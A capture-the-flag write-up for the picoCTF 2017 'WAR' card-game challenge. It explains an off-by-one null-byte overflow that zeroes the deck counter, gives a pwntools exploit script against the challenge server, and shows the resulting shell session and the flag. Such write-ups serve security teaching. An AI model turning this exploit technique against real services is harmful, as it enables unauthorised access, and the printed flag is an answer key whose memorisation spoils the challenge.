## WAR - 125

### Description

Win a simple [Card Game](war). [Source](war.c). Connect on shell2017.picoctf.com:5194.

### Hint

  - Bugs typically happen in groups. If you find one, what does it allow you to do?

### Write up

The bug happens in `readInput()` function.

```c
unsigned int readInput(char * buff, unsigned int len){
    size_t count = 0;
    char c;
    while((c = getchar()) != '\n' && c != EOF){
        if(count < (len-1)){
            buff[count] = c;
            count++;
        }
    }
    buff[count+1] = '\x00';
    return count;
}
```

The function gets input from the user. When adding NULL byte at the end, it uses 'count + 1' index.

But as count increments to len-1, count + 1 in the end is actually len, which occurs overflow.

```c
if(!readInput(gameData.name,NAMEBUFFLEN)){
    printf("Read error. Exiting.\n");
    exit(-1);
}
```

So here is where we can make the overflow happen.

```c
typedef struct _gameState{
  int playerMoney;
  player ctfer;
  char name[NAMEBUFFLEN];
  size_t deckSize;
  player opponent;
} gameState;
```

`gameData.name` is beside of `deckSize`.

```c
gameData.deckSize--;
if(gameData.deckSize == 0){
    printf("All card used. Card switching will be implemented in v1.0, someday.\n");
    exit(0);
}
```

and the `deckSize` is used for checking game end.

But if we set `deckSize` to 0 by overflow, the if statement become always false ( startswith -1 ), so the game never ends!

And then,

```c
gameData.ctfer.playerCards.top++;
gameData.opponent.playerCards.top++;
```

```c
size_t playerIndex = gameData.ctfer.playerCards.top;
size_t oppIndex = gameData.opponent.playerCards.top;
oppCard = &gameData.opponent.playerCards.cards[oppIndex];
playCard = &gameData.ctfer.playerCards.cards[playerIndex];
```

these code will make some unexpected results.

```python
from pwn import *
import sys
import struct

p = remote('shell2017.picoctf.com', 5194)
# p = process(['./matrix'])

p.sendline('a'*36)
p.recvuntil('Welcome aaa')
p.recvline()

while True:
    p.sendline('1')

    p.recvline() # you have ...
    p.recvline() # How much would you ...
    p.recvline() # you bet %d
    p.recvline() # The opponent ...
    p.recvline() # You have a ...

    r = p.recvline()

    if 'You lost!' in r:
        pass
    else:
        r = p.recvline() # Cheater... or You auctually won!
        print 'recv ' + r
        if "Nice job" in r:
            p.interactive()
            break

    p.recvline() # newline in the end
```

What this code does is,

  - bet 1 while you are losing (top < 26 )
  - bet 1 while you are considered as cheating ( top > 26)

and at some point, you starts winning.

At that point, the console becomes interactive mode, and you can start a real betting.

```
You have 33 coins.
How much would you like to bet?
$ 30
you bet 30.
The opponent has a 0 of suit 0.
You have a 14 of suit 2.
You won? Hmmm something must be wrong...
You actually won! Nice job

You have 63 coins.
How much would you like to bet?
$ 60
you bet 60.
The opponent has a 0 of suit 0.
You have a 13 of suit 2.
You won? Hmmm something must be wrong...
You actually won! Nice job

...

You have 483 coins.
How much would you like to bet?
$ 20
you bet 20.
The opponent has a 0 of suit 0.
You have a 10 of suit 2.
You won? Hmmm something must be wrong...
You actually won! Nice job
You won the game! That's real impressive, seeing as the deck was rigged...
/bin/sh: 0: can't access tty; job control turned off
$ $ ls
flag.txt
war
war_no_aslr
xinetd_wrapper.sh
$ $ cat flag.txt
d64f04b89dbc6a41901c6a918a443a58
$
```

> d64f04b89dbc6a41901c6a918a443a58
